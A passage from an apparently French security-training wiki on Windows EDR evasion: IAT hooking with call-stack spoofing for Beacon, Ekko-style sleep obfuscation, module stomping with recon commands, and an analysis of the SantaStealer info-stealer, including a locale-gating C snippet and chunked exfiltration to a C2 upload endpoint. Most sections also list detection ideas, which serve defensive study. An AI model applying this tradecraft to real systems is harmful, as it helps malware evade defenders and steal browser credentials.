- Au chargement de la DLL hôte, parcourir son IMAGE_IMPORT_DESCRIPTOR et patcher les entrées IAT des imports ciblés (par ex. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) pour pointer vers de fins wrappers PIC.
- Chaque wrapper PIC exécute des evasions avant d’appeler en tail-call la vraie adresse de l’API. Les evasions typiques incluent :
- Masquage/démasquage mémoire autour de l’appel (par ex. chiffrer les régions beacon, RWX→RX, changer les noms/permissions des pages) puis restauration après l’appel.
- Call-stack spoofing : construire une pile bénigne et basculer vers l’API cible afin que l’analyse de call-stack résolve des frames attendues.
- Pour la compatibilité, exposer une interface afin qu’un script Aggressor (ou l’équivalent) puisse enregistrer quelles APIs hooker pour Beacon, BOFs et les DLLs post-ex.

Pourquoi faire du IAT hooking ici
- Fonctionne pour tout code qui utilise l’import hooké, sans modifier le code de l’outil ni dépendre de Beacon pour proxy des APIs spécifiques.
- Couvre les DLLs post-ex : hooker LoadLibrary* permet d’intercepter les chargements de modules (par ex. System.Management.Automation.dll, clr.dll) et d’appliquer le même masquage/l’évasion de stack à leurs appels d’API.
- Restaure l’utilisation fiable des commandes post-ex de lancement de processus contre les détections basées sur le call-stack en encapsulant CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Appliquez le patch après les relocations/ASLR et avant la première utilisation de l'import. Des reflective loaders comme TitanLdr/AceLdr montrent le hooking pendant le `DllMain` du module chargé.
- Gardez les wrappers minuscules et PIC-safe ; résolvez la vraie API via la valeur IAT d'origine que vous avez capturée avant le patching ou via `LdrGetProcedureAddress`.
- Utilisez des transitions RW → RX pour le PIC et évitez de laisser des pages writable+executable.

Call‑stack spoofing stub
- Les PIC stubs à la Draugr construisent une fausse chaîne d'appels (adresses de retour vers des modules bénins), puis pivotent vers la vraie API.
- Cela contourne les détections qui attendent des stacks canoniques depuis Beacon/BOFs vers des APIs sensibles.
- Combinez avec stack cutting/stack stitching pour atterrir dans des frames attendues avant le prologue de l'API.

Operational integration
- Préfixez le reflective loader aux DLL post-ex pour que le PIC et les hooks s'initialisent automatiquement lorsque la DLL est chargée.
- Utilisez un script Aggressor pour enregistrer les APIs cibles afin que Beacon et les BOFs bénéficient de façon transparente du même chemin d'évasion sans changement de code.

Detection/DFIR considerations
- IAT integrity : entrées qui résolvent vers des adresses non-image (heap/anon) ; vérification périodique des pointeurs d'import.
- Stack anomalies : adresses de retour n'appartenant pas aux images chargées ; transitions brutales vers du PIC non-image ; ancestry RtlUserThreadStart incohérente.
- Loader telemetry : écritures in-process dans l'IAT, activité précoce de `DllMain` qui modifie les import thunks, régions RX inattendues créées au chargement.
- Image-load evasion : si vous hookez `LoadLibrary*`, surveillez les chargements suspects d'automation/clr assemblies corrélés avec des événements de memory masking.

Related building blocks and examples
- Reflective loaders qui effectuent du IAT patching pendant le chargement (p. ex., TitanLdr, AceLdr)
- Memory masking hooks (p. ex., simplehook) et PIC de stack-cutting (stackcutting)
- PIC call-stack spoofing stubs (p. ex., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Si vous contrôlez un reflective loader, vous pouvez hooker les imports **pendant** `ProcessImports()` en remplaçant le pointeur `GetProcAddress` du loader par un resolver personnalisé qui vérifie d'abord les hooks :

- Construisez un **resident PICO** (persistent PIC object) qui survit après que le PIC transient du loader se soit libéré.
- Exposez une fonction `setup_hooks()` qui écrase le resolver d'import du loader (p. ex., `funcs.GetProcAddress = _GetProcAddress`).
- Dans `_GetProcAddress`, ignorez les imports par ordinal et utilisez une recherche de hook basée sur un hash comme `__resolve_hook(ror13hash(name))`. Si un hook existe, renvoyez-le ; sinon déléguez au vrai `GetProcAddress`.
- Enregistrez les cibles de hook au moment du link avec des entrées Crystal Palace `addhook "MODULE$Func" "hook"`. Le hook reste valide parce qu'il vit à l'intérieur du resident PICO.

Cela permet une **redirection IAT au moment de l'import** sans patcher la section de code du DLL chargé après le chargement.

### Forcer des imports hookables lorsque la cible utilise PEB-walking

Les hooks au moment de l'import ne se déclenchent que si la fonction se trouve réellement dans l'IAT de la cible. Si un module résout les APIs via PEB-walk + hash (aucune entrée d'import), forcez un vrai import pour que le chemin `ProcessImports()` du loader le voie :

- Remplacez la résolution d'export hashée (p. ex., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) par une référence directe comme `&WaitForSingleObject`.
- Le compilateur émet une entrée IAT, ce qui permet l'interception lorsque le reflective loader résout les imports.

### Sleep/idle obfuscation à la Ekko sans patcher `Sleep()`

Au lieu de patcher `Sleep`, hookez les **vraies primitives de wait/IPC** utilisées par l'implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Pour les longs waits, encapsulez l'appel dans une chaîne d'obfuscation à la Ekko qui chiffre l'image en mémoire pendant l'inactivité :

- Utilisez `CreateTimerQueueTimer` pour planifier une séquence de callbacks qui appellent `NtContinue` avec des frames `CONTEXT` forgées.
- Chaîne typique (x64) : passer l'image à `PAGE_READWRITE` → chiffrer en RC4 via `advapi32!SystemFunction032` sur l'image mappée complète → effectuer le wait bloquant → déchiffrer en RC4 → **restaurer les permissions par section** en parcourant les sections PE → signaler la fin.
- `RtlCaptureContext` fournit un modèle de `CONTEXT` ; clonez-le dans plusieurs frames et définissez les registres (`Rip/Rcx/Rdx/R8/R9`) pour invoquer chaque étape.

Détail opérationnel : renvoyez “success” pour les longs waits (par ex., `WAIT_OBJECT_0`) afin que l'appelant continue pendant que l'image est masquée. Ce pattern cache le module aux scanners pendant les fenêtres d'inactivité et évite la signature classique de `Sleep()` patché.

Idées de détection (basées sur la télémétrie)
- Rafales de callbacks `CreateTimerQueueTimer` pointant vers `NtContinue`.
- `advapi32!SystemFunction032` utilisé sur de grands buffers contigus de taille image.
- `VirtualProtect` sur une grande plage suivi d'une restauration personnalisée des permissions par section.


## Precision Module Stomping

Le Module stomping exécute des payloads depuis la **section `.text` d'un DLL déjà mappé dans le processus cible** au lieu d'allouer une mémoire private executable évidente ou de charger un nouveau DLL sacrificiel. La cible d'écrasement doit être une **image loaded, disk-backed** dont l'espace de code peut absorber le payload sans corrompre les chemins de code dont le processus a encore besoin.

### Reliable target selection

Un stomping naïf contre des modules courants comme `uxtheme.dll` ou `comctl32.dll` est fragile : le DLL peut ne pas être chargé dans le processus distant, et une région de code trop petite fera crasher le processus. Un workflow plus fiable est :

1. Énumérez les modules du processus cible et conservez une **liste d'inclusion basée uniquement sur les noms** des DLL déjà chargées.
2. Construisez d'abord le payload et enregistrez sa **taille exacte en bytes**.
3. Parcourez les DLL candidates sur disque et comparez le **`.text` `Misc_VirtualSize`** de la section PE à la taille du payload. Cela compte plus que la taille du fichier car cela reflète la taille de la section exécutable **une fois mappée en mémoire**.
4. Parsez la **Export Address Table (EAT)** et choisissez une RVA de fonction exportée comme offset de départ du stomp.
5. Calculez le **blast radius** : si le payload dépasse la limite de la fonction sélectionnée, il écrasera les exports adjacents placés après elle en mémoire.

Typical recon/selection helpers seen in the wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Notes opérationnelles
- Préférez les DLLs **déjà chargées** dans le processus distant pour éviter la télémétrie de `LoadLibrary`/des chargements d’image inattendus.
- Préférez des exports rarement exécutés par l’application cible, sinon les chemins d’exécution normaux peuvent atteindre les octets stomped avant ou après la création du thread.
- Les implants volumineux nécessitent souvent de passer l’intégration du shellcode d’une chaîne littérale à un **byte-array/braced initializer** afin que le buffer complet soit représenté correctement dans le source de l’injector.

Idées de détection
- Écritures distantes dans des **pages exécutables image-backed** (`MEM_IMAGE`, `PAGE_EXECUTE*`) au lieu des allocations privées RWX/RX plus courantes.
- Points d’entrée d’export dont les octets en mémoire ne correspondent plus au fichier backing sur disque.
- Threads distants ou pivots de contexte qui commencent l’exécution à l’intérieur d’un export de DLL légitime dont les premiers octets ont été récemment modifiés.
- Séquences suspectes de `VirtualProtect(Ex)` / `WriteProcessMemory` contre des pages `.text` de DLL, suivies de la création d’un thread.

## SantaStealer Tradecraft pour l’évasion fileless et le vol d’identifiants

SantaStealer (aka BluelineStealer) illustre comment les info-stealers modernes combinent AV bypass, anti-analysis et accès aux identifiants dans un seul workflow.

### Gating de la disposition du clavier et délai de sandbox

- Un drapeau de config (`anti_cis`) énumère les dispositions de clavier installées via `GetKeyboardLayoutList`. Si une disposition cyrillique est trouvée, l’échantillon dépose un marqueur `CIS` vide et se termine avant d’exécuter les stealers, garantissant qu’il ne se déclenche jamais sur les locales exclues tout en laissant un artefact de hunting.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Logique `check_antivm` en couches

- La variante A parcourt la liste des processus, hache chaque nom avec une somme de contrôle glissante personnalisée, puis la compare à des blocklists intégrées pour les debuggers/sandboxes ; elle répète la somme de contrôle sur le nom de l’ordinateur et vérifie des répertoires de travail tels que `C:\analysis`.
- La variante B inspecte des propriétés système (seuil minimal de nombre de processus, uptime récent), appelle `OpenServiceA("VBoxGuest")` pour détecter les additions VirtualBox, et effectue des vérifications de timing autour de `sleep` pour repérer le single-stepping. Toute détection provoque l’abandon avant le lancement des modules.

### Helper fileless + chargement réfléchi double ChaCha20

- La DLL/EXE principale embarque un Chromium credential helper qui est soit déposé sur disque, soit mappé manuellement en mémoire ; le mode fileless résout lui-même les imports/relocations afin qu’aucun artefact de helper ne soit écrit.
- Ce helper stocke une DLL de second stade chiffrée deux fois avec ChaCha20 (deux clés de 32 bytes + nonces de 12 bytes). Après les deux passes, il charge réflexivement le blob (sans `LoadLibrary`) et appelle les exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` dérivés de [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Les routines ChromElevator utilisent un reflective process hollowing en direct-syscall pour injecter dans un navigateur Chromium actif, hériter des clés AppBound Encryption, et déchiffrer les passwords/cookies/credit cards directement depuis les bases de données SQLite malgré le durcissement ABE.


### Collecte modulaire en mémoire et exfiltration HTTP par chunks

- `create_memory_based_log` parcourt une table globale de pointeurs de fonction `memory_generators` et lance un thread par module activé (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Chaque thread écrit les résultats dans des buffers partagés et signale son nombre de fichiers après une fenêtre de jointure d’environ 45s.
- Une fois terminé, le tout est compressé avec la bibliothèque liée statiquement `miniz` sous `%TEMP%\\Log.zip`. `ThreadPayload1` dort ensuite 15s et envoie l’archive par chunks de 10 MB via HTTP POST vers `http://<C2>:6767/upload`, en usurpant un boundary `multipart/form-data` de navigateur (`----WebKitFormBoundary***`). Chaque chunk ajoute `User-Agent: upload`, `auth: <build_id>`, éventuellement `w: <campaign_tag>`, et le dernier chunk ajoute `complete: true` afin que le C2 sache que la réassemblage est terminé.

## Références


- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
